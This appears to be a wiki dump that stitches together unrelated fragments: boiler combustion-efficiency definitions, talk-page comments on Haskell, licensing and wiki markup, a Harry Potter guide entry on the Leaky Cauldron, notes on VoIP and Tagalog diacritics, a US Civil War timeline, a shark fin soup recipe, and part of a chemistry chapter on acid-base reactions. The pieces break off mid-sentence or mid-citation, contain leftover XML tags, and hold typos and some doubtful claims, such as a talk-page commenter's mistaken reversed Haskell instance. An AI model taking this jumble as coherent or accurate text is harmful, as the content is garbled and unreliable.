Carbon monoxide concentration is quantifiable measure of unburned fuel. Most combustion analyzers measure CO in parts per million (ppm). Levels over 400 ppm are consedered dangerous for people. Many combustion analyzers do not measure levels above 400 ppm. Note that this level (0.04%) has a negligible effect on combustion efficiency, but may be an indicator of burner or other boiler problems. SteamMaster calculates the effects of CO, which can be significant at dangerously high concentrations. If you encounter stack concentrations of CO over 400 ppm, advise plant management to have the boiler maintained immediately. 

'''Stack Temperature (F)'''
The temperature of stack gases is used to calculate the amount of heat leavings the boiler.

'''Net Stack Temperature (F)'''
Stack minus Inlet Air Temperatures is used to calculate the amount of heat the boiler adds to the fuel and combustion air mixture.

==Efficiency==
Combustion efficiency is calculated using the ASME indirect method (see COMBUSTION EFFICIENCY DEFINITIONS section) in which the following losses are calculated and subtracted from 100%. The method and formulas are documented in the ASME standards.

'''Dry Gas Losses'''represent sensible heat leaving the boiler stack.

'''Moisture Formation''' is the loss calculated from burning hydrogen in the fuel.

'''Moisture in Fuel (wet basis)''' is the loss required to evaporate and heat moisture contained in the fuel. Most fossil fuels contains little or no moisture. Wood fuel often has a significant moisture content.

'''Carbon Monoxide''' are losses from the energy of formation of CO that have not been fully released in the combustion process.

'''Losses due to ash''' Wood generally contains ash, which does not combust. Therefore, ash concentration (generally small) is subtract from the heating value of the fuel.

'''Moisture in the air''' is another source of water that removes heat from the system.

'''Combustion Efficiency''' Subtract the previous losses from 100% to calculate combustion efficiency.

'''Radiation/Convection Losses'''
Hot boilers lose heat to their surrounding by radiation and convection. SteamMaster uses a curvefit of a graph found in the ASME Steam Unit Generation standard. ?????

If I do not hear from them, I found a similar diagram on this website - [http://www.pre-emergency.com/planning/school_preparedness.htm] Is that picture okay? It does not say if there is a license. - DaniellaU6

      <text xml:space="preserve">Haskell/MonadPlus
Section &quot;Relationship with Monoids&quot;
I am not sure if this is a error in the original text:

''Monoids, then, look very similar to MonadPlus instances. Both feature concepts of a zero and plus, and indeed MonadPlus can be a subclass of Monoid (the following is not Haskell 98, but works with -fglasgow-exts):

instance MonadPlus m =&gt; Monoid (m a) where
  mempty  = mzero
  mappend = mplus''

And I think the instance declaration should be:

''instance Monoid (m a) =&gt; MonadPlus m where
  mzero = mempty
  mplus = mappend

== General Overview ==

The '''Leaky Cauldron''' is a popular Wizarding pub in London. It is the entrance to [[Muggles' Guide to Harry Potter/Places/Diagon Alley|Diagon Alley]]. For much of the end of the 20th Century, Tom was the landlord.

== Extended Description ==

{{Muggles' Guide to Harry Potter/Beginner Spoiler}}

The pub was built by Daisy Dodderidge in 1500 &quot;to serve as a gateway between the non-wizarding world and Diagon Alley.&quot; It rents rooms, has a bar, several private parlor rooms, and a large dining room. 

To Muggles, the pub appears to be a broken-down old shop front on Charing Cross Road. The rear of the pub, however, opens up onto a chilly courtyard and the entrance to Diagon Alley. To gain access, a witch or wizard taps a specific brick in the wall with his or her wand. A doorway to Diagon Alley then forms which then re-arranges back to the original wall after the person(s) walk through.

[[Muggles' Guide to Harry Potter/Characters/Harry Potter|Harry]] is re-introduced to the Wizarding World on his 11th birthday, July 31st 1991, by [[Muggles' Guide to Harry Potter/Characters/Rubeus Hagrid|Rubeus Hagrid]]. A major part of that re-introduction happens when Hagrid escorts Harry through The Leaky Cauldron. Harry is embarrassed to find out that he has been famous all his life, all the more because it is for something he has no recollection of doing.

Harry spends the last fortnight of his summer vacation in his [[Muggles' Guide to Harry Potter/Books/Prisoner of Azkaban|third year at Hogwarts]] living in The Leaky Cauldron. This is done, apparently, to protect him from the escaped murderer, [[Muggles' Guide to Harry Potter/Characters/Sirius Black|Sirius Black]]. During this time, watching the clientele of the Leaky Cauldron, Harry believes that he sees a hag.

In Harry's [[Muggles' Guide to Harry Potter/Books/Half-Blood Prince|sixth year]], we are shown a memory of [[Muggles' Guide to Harry Potter/Characters/Albus Dumbledore|Professor Dumbledore's]] in which the young [[Muggles' Guide to Harry Potter/Characters/Tom Marvolo Riddle|Tom Riddle]] is told to ask the landlord at the Leaky Cauldron for help getting in to Diagon Alley. The landlord's name is then given as Tom. As internal evidence in the series suggests Tom Riddle was born in the early 1920s, and at the time of Dumbledore's memory he would have been 11, Tom would have been the landlord in about 1930 as he was up until the end of the Potter series, in 1998. If he has been landlord of The Leaky Cauldron for sixty years when Harry first sees him, it is little wonder that Harry thinks him extremely old and compares him to &quot;a gummy walnut&quot;.

Tom is still behind the bar in the final book in the series, when the Trio pass through on their way to Diagon Alley and [[Muggles' Guide to Harry Potter/Places/Gringotts|Gringotts Bank]].

== Analysis ==

As is mentioned in the article about [[Muggles' Guide to Harry Potter/Places/The Three Broomsticks|the Three Broomsticks]] in [[Muggles' Guide to Harry Potter/Places/Hogsmeade|Hogsmeade]], British village life, and to a large extent British city life, revolves around the pub, the &quot;home away from home&quot; for most British people. It is unsurprising that there should be a Wizarding pub in London; and equally it should come as no surprise that the pub acts as a connection between the Wizarding and Muggle worlds. Pubs quite often acted as rest stops for horse-drawn carriages, and so often marked transitions in travel; making a pub also serve as the transition to magical London seems a simple extension of that.

In [[Muggles' Guide to Harry Potter/Places/Hogwarts School of Witchcraft and Wizardry#School population|the article on Hogwarts]], it was calculated that, based on the population of the school, there is one wizard for every 6,000 Muggles. Given a Muggle population of 7.1 million in Greater London as of 2001, this gives a total of about 1,200 wizards in all of London. This population would represent a fairly small village, spread over a significant geographical space. As wizards will tend to congregate, for instance in the villages of Hogsmeade and [[Muggles' Guide to Harry Potter/Places/Godric's Hollow|Godric's Hollow]], it is likely that in fact there are fewer than a thousand wizards in London. All the same, they will need places where they can meet and be assured that no Muggles will be alarmed by their actions, and what better place than a pub? And just as a Muggle village of a thousand people can support two or three pubs, so could we expect that the London wizard population could support the Leaky Cauldron, plus possibly two or more others.

Like many pubs, the Leaky Cauldron serves as something of a neutral ground. Harry notes that he believes he sees a hag there, and even under the Death Eaters, people are still visiting and Tom is still in business. As mentioned in the article on the [[Muggles' Guide to Harry Potter/Places/Hog's Head Inn|Hog's Head]], there are pubs which position themselves for the family trade, and those which provide a home for the less savory interactions; the Leaky Cauldron is quite firmly in the former category, catering as it does for the families of Hogwarts students as they shop each August for the needs of their upcoming term. We can assume that shadier business is transacted in the darker corners, but we don't see it.

== Questions ==

== Greater Picture ==

{{Muggles' Guide to Harry Potter/Intermediate Spoiler}}

The author has said in interviews after publication of the seventh book in the series that the pub is later taken over by [[Muggles' Guide to Harry Potter/Characters/Hannah Abbott|Hannah Abbott]], who has married [[Muggles' Guide to Harry Potter/Characters/Neville Longbottom|Neville Longbottom]], then professor of [[Muggles' Guide to Harry Potter/Magic/Herbology|Herbology]] at Hogwarts. It is our opinion that this is not canon, and is unsupported by anything in the books; all we really know about Hannah is her family's encounters with [[Muggles' Guide to Harry Potter/Major Events/Death Eaters|Death Eaters]], and that she seems to get extremely nervous at exam time. Like so much else that has come to light in interviews after publication, it seems that this &quot;fact&quot; may have been made up on the spur of the moment in order to please the fans.

      <text xml:space="preserve">== YouTube Video on Voice over IP: Shenetta Richardson, Systems Engineer ==

The future of real time voice communications is evolving from the traditional TDM circuit switch infrastructure.  VoIP is simply the transmission of voice traffic over IP-base networks.  The Internet Protcol was originally designed for data networking.  The success of IP is becoming a world standard for data networking and has led to adaptation into the voice network which allows you to make voice calls using a broadband internet connection instead of the regular analog phone line.

This image is a scan of my first paper about voltage compensation idea that I presented at  ELECTRONICS'1997 conference 12 years ago:

Mechkov C., Heuristic methods for converting passive analog devices into negative feedback active circuits, Proceedings of The Sixth Int. Conference ELECTRONICS'97, 1997.

I have not a doc or pdf file; I have only a printed version of the paper. [[User:Circuit-fantasist|Circuit-fantasist]] ([[User talk:Circuit-fantasist|talk]]) 14:44, 27 March 2009 (UTC)</text>

      <text xml:space="preserve">This is very much a work in progress, and the contributors are pretty busy people. But we're working and talking! If you have anything you'd like to see us add to this book, let us know here!

To join this project, sign your username under the Contributors heading (Just type &quot;~&quot; four times). There is also an Authors/Contributors chapter where you can give a short bio and/or relevant information about yourself, as well as general information about how you contributed to the project.

Thanks!

==Suggestions/Issues==
*If you have something to add but are not comfortable working with wiki pages yet, feel free to comment on that here, and someone might be able to help you. You can post anyway and allow others to help clean up your contributions, even post without trying any wiki formatting if you are not comfortable with it. You should cite sources though, at least by putting the relevant information (which you can find by doing a quick google search on citing sources) in parentheses. 
*If you would like to contribute but do not know where to start looking for sources, try the [[A Summary of Theology and Thought in Messianic Judaism/For More Information|For More Information]] page. If you cannot find what you're looking for, make a request on the talk page for that chapter, and other contributors can hunt work on finding sources that fit when they get a chance.

==Questions/Topics You'd Like to See==

Shouldn't this be part of Christianity?

==What We Need==
*Contributors 
*Content in the chapters
*Sources - Please post any that you think would be helpful on the [[A Summary of Theology and Thought in Messianic Judaism/For More Information|For More Information]] page.

      <text xml:space="preserve">==Reflist coding==
I've noticed the reflist coding isn't working right. For instance the reflist on my recipe, [[cookbook:Red paella, made with chicken and seafood]] (recipe number 142) is displaying references from [[Cookbook:Ratatouille]] (recipe number 138) even though the reflist command is working correctly in the recipe's module. Why is this and how do I correct it? [[User:Moby-Dick4000|Moby-Dick4000]] ([[User talk:Moby-Dick4000|talk]]) 19:56, 27 March 2009 (UTC)</text>

== Palatuldikan (Diacritics)==
:''Continued from [[Tagalog/Lesson 1]]''
Diacritics are normally not written in everyday usage, be it in publications or personal correspondence. The teaching of diacritics is inconsistent in Filipino schools and many Filipinos do not know how to use them. However, diacritics are normally used in dictionaries and in textbooks aimed at teaching the languages to foreigners.

There are three kinds of diacritics used in Tagalog:

;Acute accent or ''pahilís'' : Used to indicate primary or secondary stress on a particular syllable; ''talagá''. It is usually omitted on words that are stressed on the penultimate (second to last) syllable; ''umága = umaga''. It is possible that there is more than one stressed syllable in a word, meaning that that ''pahilís'' mark may appear multiple times, as in ''Repúbliká''. If there is no diacritic on the last two syllables of a word, then it means that there is stress on the penultimate syllable; ''kásayahan'' is actually stressed on two syllables: ''&lt;u&gt;ká&lt;/u&gt;sa&lt;u&gt;ya&lt;/u&gt;han''.

;Grave accent or ''paiwà'' : It indicates that there is a glottal stop (/ʔ/) at the end of the word; ''akalà''. This mark may only appear at the end of a word that ends in a vowel. This mark does not indicate stress. Therefore, following the previously stated rule on stress, ''akalà'' is stressed on the second to the last syllable: ''a&lt;u&gt;ka&lt;/u&gt;là''.

;Circumflex accent or ''pakupyâ'' : It indicates that the final syllable of a word receives stress while there is a glottal stop (/ʔ/) that follows; ''sampû''. This is because it is a combination of the ''pahilís'' and ''paiwà'' marks. This mark may only appear at the end of a word that ends in a vowel. ''dálitâ = &lt;u&gt;dá&lt;/u&gt;li&lt;u&gt;tâ&lt;/u&gt;''

===Pronunciation cases===

Diacritics are an optional aspect of the Tagalog orthography. Most Filipinos (and Philippine news journals) write Tagalog without using any diacritic at all. However, pieces of Tagalog writing which use diacritics can occasionally be found in some religious journals, old books, and others.

A word in Tagalog spelled in a certain way without the diacritics can actually be pronounced in four ways, and each case results into a different meaning or a different word in itself. The four cases are:

&lt;b&gt;Stressed end&lt;/b&gt;

This case is where a word is stressed in the last or end syllable. The vowel of the last syllable should contain an acute diacritic mark.

Examples: &quot;akó&quot; (me), &quot;lakí&quot; (size), &quot;parú-paró&quot; (butterfly), &quot;sangá&quot; (branch), &quot;talagá&quot; (really)

&lt;b&gt;Unstressed end&lt;/b&gt;

This case is where a word is unstressed in the last or end syllable. In Tagalog, this entails the need to stress the penultimate or 2nd-to-the-last syllable. The vowel of the penultimate syllable should contain an acute diacritic mark.

Examples: &quot;bóbo&quot; (moron), &quot;hábal-hábal&quot; (motorcyle taxi), &quot;ílog&quot; (river), &quot;kasalánan&quot; (sin), &quot;sáko&quot; (sack), &quot;umága&quot; (morning)

The unstressed end case is the Tagalog's &lt;b&gt;default case&lt;/b&gt;. Readers who read a diacritic-supported Tagalog document should use the unstressed end case whenever he/she sees a word without any diacritic mark. Most Tagalog journals which employ diacritics only choose to use diacritics for unstressed end case words if those words could be confused as the words in the other cases. So they spell &quot;píto&quot; to differentiate whistle (&quot;píto&quot;) from seven (&quot;pitó&quot;). However, if the word has no corresponding word in another case, it is written without diacritics. So these journals will use &quot;umaga&quot; instead of &quot;umága&quot;, because no other &quot;umaga&quot; word exists in other cases.

Alternately, older Tagalog conventions often moves the acute diacritic mark from the penultimate syllable to the very first stressed syllable of the word. There are Tagalog words which have two or more stressed syllables in the first place. So &quot;kasalánan&quot; is spelled as &quot;kásalanan&quot; in older conventions because its first stressed syllable is &quot;ka&quot;. However, modern guidelines has deprecated this rule, because the Filipino people, most of which has no formal linguistic training, even find it difficult to pinpoint which syllables are being stressed and not. So &quot;kasalánan&quot; is the correct diacritic-supported spelling using modern guidelines. 

&lt;b&gt;Glottal stopped end&lt;/b&gt;

This case is where a word is applied with a glottal stop in the last or end syllable which is unstressed. The vowel of the last syllable should contain a grave diacritic mark.

Examples: &quot;akalà&quot; (assumption), &quot;bagà&quot; (lungs), &quot;gurò&quot; (teacher), &quot;labò&quot; (unclear), &quot;lahì&quot; (race), &quot;pukè&quot; (vagina)

Because the last syllable is unstressed, then just like the unstressed end case, the penultimate syllable is therefore stressed. This means we could spell it like &quot;akálà&quot;. However, there is no need to add the acute diacritic mark in there. So &quot;akalà&quot; is okay.

&lt;b&gt;Glottal stopped stressed end&lt;/b&gt;

This case is where a word is applied with a glottal stop in the last or end syllable which is stressed. The vowel of the last syllable should contain a circumflex diacritic mark. You can imagine &quot;â&quot; as &quot;á&quot; and &quot;à&quot; combined.

Examples: &quot;larô&quot; (play), &quot;salitâ&quot; (word), &quot;sawî&quot; (emotionally devastated), &quot;tahî&quot; (sew)

=== Older conventions ===
Before the standardization of Tagalog during the mid-20th century, the acute accent (''pahilís'') functioned in the same way as it is used in Spanish orthography today. The older version is no longer in use.

Words stressed on the last syllable use an accent when they end with a vowel (''a, e, i, o, u''), with ''-n'', or with  ''-s'', as in ''Magandá'', ''bilí'', ''Inglés''. Words stressed on the next-to-last syllable use an accent when they do not end with a vowel (''a, e, i, o, u''), with  ''-n'' or with  ''-s'', as in ''Kabuháyan'', ''Umútang''. Words stressed on other syllables ''always'' take the accent, as in ''Matemátika''. Words not stressed on the last syllable but end with a vowel (''a, e, i, o, u'') do not use the acute accent, unless stress is on the final vowel. In the older system, the word ''Repúbliká'' would be written simply as ''Repúblika''. The newer version &quot;''Repúbliká''&quot; is written this way in order to be consistent with the new rules for using diacritics (&quot;If there is no accent upon the last two syllables of a word, then the stress is on the second-to-last syllable&quot;).

== Clock &amp; Data recovery ==
=== The CDR function is a simple one and just three architectures are sufficient to model it. The actual implementation of the CDR may differ from the neat, simple analog structure of the mathematical models. Complex digital blocks, DLLs, DSPs may disguise the architecture, but the fundamental operation of the CDR will not differ. Knowledge of the three models is fundamental to imagine, specify, design, check, measure and interpret the behavior of the CDR. Reference to them is the best way to avoid confusion and errors. ===

This article needs major re-writing. In actual fact there are three inflectional tenses: future, conditional and preterite: all with person conjugations. All the rest of the tenses are formed with auxiliaries. However in literary Welsh, the future is often used when talking in the present, and there are also inflectional imperfect and perfect tenses. I will do this unless there is opposition. [[Special:Contributions/86.26.86.10|86.26.86.10]] ([[User talk:86.26.86.10|talk]]) 12:41, 28 March 2009 (UTC)

      <text xml:space="preserve">If I might be so bold, might I suggest this page would function much better with images. I am not sure if that's in the style of Wikibooks.

The page is excellent as a quick reminder of what order everything falls out in (particularly that Wu/Tan/Bong/Gahn bit) but if you don't already know what the e.g. Huen sau is, this page will be completely opaque. Perhaps the hand positions etc could be linked to pages describing how they are performed.

I hope you don't mind this mild nitpicking. Thank you for recording the form online. - [[Special:Contributions/124.168.52.162|124.168.52.162]] ([[User talk:124.168.52.162|talk]]) 13:27, 28 March 2009 (UTC)

It's a fine suggestion. In theory I'm working on both an illustrated version of the Wing Chun Forms book, to be released as PDF with embedded photos, and a Wing Chun Movements book, describing how to do the named movements, also with photos. In practice, I'm up to my ears in family and work. Expected release date 2020&amp;hellip; [[User:SteveF|SteveF]] ([[User talk:SteveF|talk]]) 03:46, 8 July 2009 (UTC)

I agree entirely that this page needs imagery; without it, the article is hardly more than a jumble of words! If the author, SteveF is not up to adding the imagery for the reasons given, then someone else should be given permission to do so, or to post his/ her own (new) article, with extensive imagery (i.e., taking nothing for granted, or assuming that the reader is a greenhorn). I was going to post a comment suggesting that imagery was sorely needed here when I clicked on the Discussion tab and saw that someone else had already done so, i.e., had had the same immediate gut response to the article as had I, a greenhorn, by the way.[[User:Wikiaide|Wikiaide]] ([[User talk:Wikiaide|discuss]] • [[Special:Contributions/Wikiaide|contribs]]) 06:22, 31 August 2011 (UTC)</text>

      <text xml:space="preserve">The Origins of the American Civil War

&quot;One eight of the whole population was coloured slaves, not distributed generally over the Union, but localised in the southern part of it.  These slaves constituted a peculiar and powerful interest.  All knew that this interest was somehow the cause of the war.  To strengthen, perpetuate, and extend this interest was the object for which the insurgents would rend the Union even by war, while the government claimed no right to do more than to restrict the territorial enlargement of it.&quot; Abraham Lincoln, 2nd inaugural address.

1793: Invention of the cotton gin.  This made possible the expansion fo slavery inland and allowed for the continuance of slavery as a viable economic system.  By 1860 the South produced 4 million bales of cotton, which was 50% of US exports.

1808: US abolished the slave trade.  The value of slaves incresaed to $2,000 by 1850.  Despite only 25% of South owning slaves the existance of slaves reminded poor whites that there was a class below them in society.  Slavery permeated all aspects of Southern life, therefore, an attack on slavery was seen as an attack on the South.
&quot;Slavery was much more that an economic system.  It was a means of maintaining control and white supremacy... The economic, social and racial centrality of slavery to the Southern way of life focused the region's politics overwhelmingly on defence of the pecliar institution.&quot; A. Farmer.

1819: 11 'free' states, 11 'slave' states.  The senate was even but the North had began to dominate the House with its rapidly growing population.

1820: Missouri Compromise.  Missouri, a slave state, would join the union with Maine, a free state, to maintain the balance.  No slavery was to be subsequently allowed North of the 36'30' parallel.  The issue was not resolved, merely delegated to a later date.

1833: Britain abolished slavery throughout its empire.  This encouraged the Northern abolitionists, with a noticeable rise of militant abolitionists.

1836-48: 3 slave states and 3 free states join the union.  This preserved te sectional balance in the senate

Late 1840s: Gowing tension due to: the acquisition of Oregon in 1846, California and New Mexico in 1848, the discovery of Gold and the migration of Mormons to Utah which led to the rapid westward migration and growth.  The Wilmot Proviso 1846, which excluded slavery from any territory acquired from Mexico, was passed in the House but defeated in the Senate.  The Calhoun Doctrine 1847, argued that territories were the common property of all states, that any US citizen was free to settle in the US with its property (slaves), that the states were sovereign, they had the right to secede if the North ignored Southern interests and threatened slavery, then the South was justified in leaving the Union.

1850: Compromise.  California to join the Union as a free state, the end of slavery in Washington D.C, in Utah and New Mexico 'popular sovereignity' would decide whether the state would be slave or free, and a more stringent Fugitive slave law.
David Potter argues it was &quot;an armistice rather than a compromise&quot;

1852: Publication of 'Uncle Tom's Cabin'

1854: Kansas-Nebraska Act.  Addition of two new states, their status to be decided by poplar sovereignity, undermined the Missouri Compromise.  This re-iginited sectional tensions and fed Northern fears of a 'slave power' base.

1856: Brooks, a Southern representative, beat unconscious the abolitionist senator Sumner, on the senate floor.  The start of the violence.

'Bleeding Kansas' a minor civil war over whether to be free or slave, eventually in 1858 after a referendum the pro-slavery group was defeated.

1857: Dred Scott Case.  The Supreme Court rules that slavery could exist throughout the union, this implied that the Missouri Compromise was ubconstitutional.

Rise of the Republican Party.  The Republican Party became a fully sectional party and led to a further identication with North or South rather than with the Union, Abraham Lincoln was influential in the Douglas-Lincoln debates in splitting the democratic party.

1860: Lincoln wins the presidential election, with only 40% of the popular vote.  A complete sectinal victory, and in December South Carolina secedes from the Union, followed by 6 other states.

1861: The confederacy was formed.  Lincoln rejected any compromise such as the Crittenden Proposals.
&quot;Given the momentum of succession and the fundamental set of Republicanism, it is probably safe to say that compromise was impossible from the start&quot; David Potter.

April: Fort Sumter, remained loyal to the Union.  Lincoln chose to re-provision, and Davies demanded surrender.  When Anderson refused shots were fired at 4:30am until he surrended 33 hours later.

&quot;The social systems of slave labour and free labour 'are more than incongrous - they are incompatible', the friction between them is 'an irreconcilable conflict between opposing and endring forces.'&quot; Seward.
&quot;The Civil War was 'The Repressible Conflict'&quot; Craven (revisionist)
- it could have been avoided had serious attempts been made to diffuse the situation, failure of the leaders to responsibly handle the situation.

'''Shark Fin Soup''', or '''Shark Fin Stew''', is [[Cookbook:Fish|fish]] [[Cookbook:Soup|soup]] believed to originate from China. On the Chinese seas during the 1800s, pirates under the control of Ch'ing Yih Szaou used to make shark fin soup that took at least 4 hours to prepare. &lt;ref&gt;{{cite book |last1=Klausmann |first1=Ulrike |last2=Meinzerin |first2=Marion |last3=Kuhn |first3=Gabriel |authorlink3=Gabriel_Kuhn |title=Women Pirates and the Politics of the Jolly Roger |format=book |accessdate=March 28, 2009 |edition=1st |year=1997 |publisher=Black Rose Books Ltd |location=C.P. 1258 Succ.

Recipes of shark fin soup vary, but shark fin is an essential ingredient.

==Ingredients==
===Soup===
*400 grams shark fins
*100 grams dried, ground shrimp
*10 large dried Dongu mushrooms
*50 grams dried bamboo shoots
*1 slice ginger root
*2 tablespoons bacon fat
*1 teaspoon salt
*2 tablespoons soy sauce
*4 tablespoons Chinese white wine
*3/4 litres chicken broth
*Fish stock from red-boiled fins
*1 teaspoon sesame oil
*1 tablespoon corn starch

==Procedure==
#Clean the fins, place in lukewarm water. 
#Soak ground shrimp and dried mushrooms for thirty minutes in 1/4 litre of warm water. The water can then be discarded. The dried bamboo should also be soaked until soft, then cut into thin strips.
#Thoroughly clean and scale the shark fins, place in a litre of water.
#Simmer for one hour. Afterwards set the water aside.
#Place fins in a fresh litre of water and bring to a boil.
#Reduce heat and simmer, covered, for an hour and a half. Afterwards strain fins.
#In a separate pot, add chicken broth and bring to a boil.
#Add ginger and shrimp, simmering for thirty minutes.
#Remove from heat and strain the broth, discarding the shrimp and ginger. 
#In a separate pot, heat the bacon fat, adding the bamboo shoots and mushrooms together with salt.
#Saute for one minute, then add soy sauce, wine, broth, fish stock, and fins. Boil under low heat, stirring frequently, for twenty minutes.
#Remove from heat and slowly stir in the corn starch, in small increments. Sprinkle sesame oil on the soup.

Serve in a large bowl. The shark fins should remain on the surface.

      <text xml:space="preserve">{{msg:GeneralChemTOC|prev=Buffer Systems|next=Phases of Matter}}

== Overview ==
To summarize the properties and behaviors of acids and bases, this chapter lists and explains the various chemical reactions that they undergo.  You may wish to review [[General Chemistry/Chemical equations|chemical equations]] and [[General Chemistry/Types of chemical reactions|types of reactions]] before attempting this chapter.

The following reactions are '''net ionic equations'''.  In other words, ''spectator ions'' are not written.  If an ion does not partake in the reaction, it is simply excluded.  The spectator ions can be found because they occur on both the reactant and the product side of the equation.  Cross them out and rewrite the equation without them.  Of course, the coefficients must be equal.

Canceling out the spectator ions explains the ''net'' of net ionic equations.  The ''ionic'' part means that dissolved compounds are written as ions instead of compounds.  Acids, bases, and salts are all ionic, so they are written as separate ions if they have dissociated.

{{TextBox|1=
;Net Ionic Equations
* Soluble salts are written as ions.
:: e.g.: Na&lt;sup&gt;+&lt;/sup&gt; + Cl&lt;sup&gt;-&lt;/sup&gt;
* Solids, liquids, and gases are written as compounds.
:: e.g.: NaCl&lt;sub&gt;(s)&lt;/sub&gt;, H&lt;sub&gt;2&lt;/sub&gt;O&lt;sub&gt;(l)&lt;/sub&gt;, HCl&lt;sub&gt;(g)&lt;/sub&gt;
* Strong acids and strong bases are written as ions (because they dissociate almost completely).
:: e.g.: H&lt;sup&gt;+&lt;/sup&gt; + NO&lt;sub&gt;3&lt;/sub&gt;&lt;sup&gt;-&lt;/sup&gt;
* Weak acids and weak bases are written as compounds (because they barely dissociate).
:: e.g.: HNO&lt;sub&gt;2&lt;/sub&gt;
}}

As an example, sodium bicarbonate (NaHCO&lt;sub&gt;3&lt;/sub&gt;) would be written as Na&lt;sup&gt;+&lt;/sup&gt; and HCO&lt;sub&gt;3&lt;/sub&gt;&lt;sup&gt;-&lt;/sup&gt; because the salt will dissociate, but the bicarbonate will not dissociate (it's a ''weak'' acid).

== Neutralization ==

When an acid and a base react, they form a neutral substance, often water and a salt.

First, let's examine the neutralization of a strong acid with a strong base.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{KOH} + \hbox{H}^+ + \hbox{Cl}^-&lt;/math&gt;
| Solid potassium hydroxide is added to an aqueous solution of hydrochloric acid.  Notice how the solid is written as a compound, but the acid is written as ions because it dissociates.
|-
| &lt;math&gt;\hbox{K}^+ + \hbox{OH}^- + \hbox{H}^+ + \hbox{Cl}^- \to \hbox{K}^+ + \hbox{Cl}^- + \hbox{H}_2\hbox{O}&lt;/math&gt;
| The hydrogen ions will react with hydroxide ions to form water.
|-
| &lt;math&gt;\hbox{H}^+ + \hbox{OH}^- \to \hbox{H}_2\hbox{O}&lt;/math&gt;
| Ignoring spectator ions, this is the ''net ionic equation''.
|}

{{Info|Whenever a strong acid neutralizes a strong base, the net ionic equation is always H&lt;sup&gt;+&lt;/sup&gt; + OH&lt;sup&gt;-&lt;/sup&gt; → H&lt;sub&gt;2&lt;/sub&gt;O}}

Now, let's see some examples involving weak acids and weak bases.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{PO}_4^{3-} + 3\hbox{H}^+ \to \hbox{H}_3\hbox{PO}_4&lt;/math&gt;
| Excess hydrochloric acid is added to a solution of sodium phosphate.  Phosphoric acid is weak, so the phosphate ions will react with hydrogen ions.  The result is a solution with some, but much less, hydrogen ions, so it is much closer to neutral than either of the original reactants.
|-
| &lt;math&gt;\hbox{PO}_4^{3-} + \hbox{H}^+ \to \hbox{H}\hbox{PO}_4^{-2}&lt;/math&gt;
| ''Equimolar'' amounts of sodium phosphate and hydrochloric acid are mixed.  Notice the difference between this reaction and the previous one.
|-
| &lt;math&gt;\hbox{HCO}_3^- + \hbox{OH}^- \to \hbox{H}_2\hbox{O} + \hbox{CO}_3^{-2}&lt;/math&gt;
| A strong base is added to a solution of calcium bicarbonate.  (Bicarbonate is a weak acid.)
|-
| &lt;math&gt;\hbox{HCO}_3^- + \hbox{H}^+ \to \hbox{H}_2\hbox{O} + \hbox{CO}_2&lt;/math&gt;
| A strong acid is added to a solution of calcium bicarbonate.  Gas bubbles appear.
|}

Many reactions result in the formation of gas bubbles or a solid precipitate that will make the solution cloudy.  The last equation brings up an interesting application.  Many rocks and minerals contain calcium carbonate or calcium bicarbonate.  To identify these rocks, geologists can perform the &quot;acid test&quot;.  A drop of acid is applied, and the presence of gas bubbles indicates carbonate.

{{Info|Many ions and compounds are '''amphoteric'''.  They can react with (or behave as) acids ''and'' bases.  Bicarbonate is a good example, as you can see by comparing the last two equations above.}}

Here are more examples of neutralization reactions.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{NH}_4\hbox{Cl} + \hbox{OH}^- \to \hbox{H}_2\hbox{O} + \hbox{NH}_3 + \hbox{Cl}^-&lt;/math&gt;
| Solid ammonium chloride crystals are dissolved into a solution of sodium hydroxide.  The smell of ammonia is detected.
|-
| &lt;math&gt;\hbox{NH}_3 + \hbox{H}^+ \to \hbox{NH}_4^+&lt;/math&gt;
| Ammonia gas is bubbled through a solution of hydrochloric acid.  This reaction is essentially the opposite of the previous.  In that reaction, ammonium ions react with base to form ammonia gas.  In this reaction, ammonia gas reacts with acid to form ammonium ions.
|-
| &lt;math&gt;\hbox{NH}_3 + \hbox{CH}_3\hbox{COOH} \to \hbox{NH}_4^+ + \hbox{CH}_3\hbox{COO}^-&lt;/math&gt;
| Ammonia (a weak base) reacts with acetic acid (also weak).  The resulting solution is nearly neutral, but it will be slightly basic because ammonia is stronger than acetic acid.
|-
| &lt;math&gt;\hbox{H}_2\hbox{S} + 2\hbox{OH}^- \to 2\hbox{H}_2\hbox{O} + \hbox{S}^{2-}&lt;/math&gt;
| Hydrogen sulfide gas is bubbled into a strong base.
|-
| &lt;math&gt;2\hbox{H}^+ + \hbox{S}^{2-} \to \hbox{H}_2\hbox{S}&lt;/math&gt;
| A strong acid is added to the above result, and hydrogen sulfide gas is released.
|}

== Anhydrides ==

An ''anhydride'' is a substance that does not contain water.  More specifically, it is a substance that reacts with water to form an acid or base.  Anhydrides are usually in the form of a gas that dissolves into water and reacts to form an acid or base.  They can also be solids that will react with water.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{N}_2\hbox{O}_5 + \hbox{H}_2\hbox{O} \to 2\hbox{H}^+ + 2\hbox{NO}_3^-&lt;/math&gt;
| Gaseous dinitrogen pentoxide is bubbled through water to form nitric acid.
|-
| &lt;math&gt;\hbox{N}_2\hbox{O}_3 + \hbox{H}_2\hbox{O} \to 2\hbox{HNO}_2&lt;/math&gt;
| Dinitrogen trioxide is mixed with water to form nitrous acid.
|}

The main difference between those two equations is the fact that nitrous acid is weak and thus does not dissociate, whereas nitric acid is strong and dissociates into ions.

Here are a few more examples of anhydride reactions.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{K}_2\hbox{O} + \hbox{H}_2\hbox{O} \to 2\hbox{K}^+ + 2\hbox{OH}^-&lt;/math&gt;
| Solid potassium oxide is added to water to form a strong base.
|-
|&lt;math&gt;\hbox{P}_2\hbox{O}_5 + 3\hbox{H}_2\hbox{O} \to 2\hbox{H}_3\hbox{PO}_4&lt;/math&gt;
| Phosphorus(V) oxide powder is mixed into water to form a weak acid.
|}

It is important to remember which acids are strong and which are weak.  [[General_Chemistry/Properties_and_Theories_of_Acids_and_Bases#Strong and Weak Acids/Bases|Review this]] if necessary.

{{Info|Anhydrides can also react with acidic or basic solutions.  In that case, you may find it helpful to first determine the anhydride's reaction with water, then determine that reaction with the acid or base.}}

For example, sulfur dioxide gas (acidic anhydride) is bubbled through a solution of calcium hydroxide (basic).
